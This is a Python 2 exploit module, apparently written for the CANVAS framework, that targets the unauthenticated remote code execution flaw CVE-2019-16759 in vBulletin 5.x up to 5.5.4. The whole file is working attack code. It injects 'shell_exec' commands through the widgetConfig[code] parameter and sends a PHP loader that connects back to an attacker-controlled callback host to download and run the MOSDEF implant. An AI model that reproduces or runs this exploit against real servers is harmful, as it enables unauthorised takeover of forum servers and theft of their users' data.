#!/usr/bin/env python2
import sys
import time
if '.' not in sys.path:
    sys.path.append('.')

import canvasengine
from exploitutils import *
from tcpexploit import tcpexploit
from ExploitTypes.CommandLineExecuter import CommandExploit

from libs.spkproxy import urlopen
from phplistener import get_php_stage1 



NAME                            = 'RCE via widgetConfig[code] paramater in vBulletin'
DESCRIPTION                     = 'An unauthenticated code execution bug can be exploited on the vBulletin core'
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "vBulletin"
DOCUMENTATION["Repeatability"]  = 'Infinite'
DOCUMENTATION["CVE Name"]       = 'CVE-2019-16759'
DOCUMENTATION["CVE Url"]        = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=2019-16759"
DOCUMENTATION["References"]     = "https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa/4422707-vbulletin-security-patch-released-versions-5-5-2-5-5-3-and-5-5-4"
DOCUMENTATION["Date public"]    = "23/09/2019"
DOCUMENTATION["NOTES"]          = """
An unauthenticated code execution bug can be exploited on the vBulletin core for the following versions:

* 5.x.x <= 5.5.4 (Tested on Ubuntu 18.10)
"""

VERSION                         = "1.0"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Exploit"
PROPERTY['SITE']                = "Serverside"
PROPERTY['ARCH']                = [ ["UNIX"], ["Windows"] ]
PROPERTY['VERSION']             = [ '<=5.5.4' ]
PROPERTY['DELIVERY']            = 'HTTP'

class theexploit(tcpexploit, CommandExploit):
    def __init__(self):
        tcpexploit.__init__(self)
        CommandExploit.__init__(self)

        self.name        = NAME
        self.path        = os.path.dirname(__file__)
        self.payloadType = 0

        self.host     = ""
        self.hostname = ''
        self.port     = 80
        self.https    = False
        self.path     = ''
        self.ua       = None
        self.blind    = False

        self.basicauth_user     = ''
        self.basicauth_password = ''

        # CommandExploit
        self.supports_universal = True

    def neededListenerTypes(self):
        import canvasengine
        return [canvasengine.PHPMULTI] 

    def getargs(self):
        self.host = self.target.interface
        self.hostname = self.argsDict.get('hostname', self.hostname)
        self.port = int(self.argsDict.get("port", self.port))
        self.getarg('https')
        self.getarg('path')
        self.path = self.path.strip('/')

        self.getarg('basicauth_user')
        self.getarg('basicauth_password')
        self.basicauth = self.basicauth_user != ''

        if self.hostname == '' or self.hostname is None:
            raise AttributeError('Missing hostname')

    def send_request(self, url, postdata, auth, noresponse=False):
        '''
        We need to send a "POST" request but using the "GET" verb
        Also we need response headers
        '''

        headers = []  # self.getExtraHeaders()
        headers.append(('Content-Type', 'application/x-www-form-urlencoded'))
        (fd, code) = urlopen(url,
                     data=postdata,
                     verb='POST',
                     exploit=self,
                     hostname=self.hostname,
                     auth=auth,
                     extraheaders=headers,
                     noresponse=noresponse,
                     entireresponse=True,
                     return_response_code=True
                    )
        if noresponse:
            return (None, None)
        return (fd.read(), code)

    def send_payload(self, postdata, noresponse=False):
        auth = None
        if self.basicauth:
            logging.debug('Using basic auth {}:{}'.format(self.basicauth_user,
                                                          self.basicauth_password))
            auth = spkproxy.BasicAuth(self.basicauth_user, self.basicauth_password)


        target = 'https' if self.https else 'http'
        target += '://' + self.hostname
        target += ':' + str(self.port) if self.port not in (80, 443) else ''
        target += self.path if self.path else ''        

        logging.debug('Sending payload')

        (response, code) = self.send_request(target, postdata, auth, noresponse=noresponse)
        return response, code

    def runcommand(self, command):
        postdata = {'routestring' : 'ajax/render/widget_php'}
        postdata['widgetConfig[code]'] = "echo shell_exec('%s'); exit;" % command
        return self.send_payload(postdata)[0]

    def get_php_to_mosdef(self):
        """
        Creates a string which when included in php's eval() will download and execute
        MOSDEF
        """        
        localhost = self.callback.ip
        localport = self.callback.port
        logging.info("Using PHPMULTI callback of %s:%d"%(localhost,localport))

        badchars = "" #none for this one
        return get_php_stage1(badchars,localhost,localport)

    def run(self):
        self.setProgress(0)
        result = False

        self.getargs()
        self.getargs_cle()
        self.setInfo("{} attacking {}:{} (in progress)".format(self.name, self.hostname, self.port))
        logging.info("Trying to determine if target is vulnerable")
        self.get_os()
        self.setProgress(33)
        if self.target_os:
            logging.info("The target appears to be vulnerable. OS: {}".format(self.target_os))
            logging.info("Building mosdef PHP")
            mosdef_php = self.get_php_to_mosdef()
            self.setProgress(66)
            postdata = {'routestring' : 'ajax/render/widget_php'}
            postdata['widgetConfig[code]'] = mosdef_php + ";exit;"
            self.send_payload(postdata, noresponse=True)
            result = True        
        else:
            logging.error("Target %s is not vulnerable" % self.host)

        if result:
            logging.info('Please use "converttomosdef" module for a full version of MOSDEF.')
            self.setProgress(100)
            self.setInfo("Use 'converttomosdef' module for a full version of MOSDEF.")
            return True
        else:
            logging.error("Failed to execute mosdef in the target %s" % self.host)
            self.setInfo("{} in {}:{} done (failed)".format(self.name, self.hostname, self.port))
            self.setProgress(-1)
            return False

if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)

